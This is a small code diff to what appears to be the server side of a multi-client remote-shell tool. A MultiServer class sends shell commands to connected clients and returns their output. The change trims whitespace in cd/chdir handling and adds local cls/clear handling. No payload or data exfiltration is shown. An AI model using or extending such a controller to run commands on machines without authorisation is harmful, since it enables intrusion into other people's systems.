@@ -1,5 +1,6 @@
 import json
 import logging
+import os
 import platform
 import socket
 import sys
@@ -402,7 +403,7 @@ class MultiServer(object):
         """ Remote Shell with Client """
         # returns command_output, cwd
         system = self.get_platform(conn)
-        if command.lower() == 'cd':
+        if command.lower().strip() == 'cd':
             self.send(conn, json_dumps(['SHELL', command]))
             result = self.receive(conn, _print=False)
             if system == 'Windows':
@@ -410,7 +411,7 @@ class MultiServer(object):
             if _print:
                 print(result)
             return result, result
-        if command[:2].lower() == 'cd' or command[:5].lower() == 'chdir':
+        if command[:2].lower().strip() == 'cd' or command[:5].lower().strip() == 'chdir':
             self.send(conn, json_dumps(['SHELL', command]))
             cwd = json.loads(self.receive(conn, _print=False).decode())
             if cwd[0] == '<ERROR>':
@@ -422,6 +423,10 @@ class MultiServer(object):
                 if _print and system == 'Windows':
                     print()
                 return cwd[0], cwd[0]
+        if command.lower().strip() == 'cls' and platform.system() == 'Windows':
+            return os.system('cls'), self.get_cwd(conn)
+        if command[:5].lower().strip() == 'clear' and platform.system() != 'Windows':
+            return os.system('clear'), self.get_cwd(conn)
         self.send(conn, json_dumps(['SHELL', command]))
         result = []
         while 1:
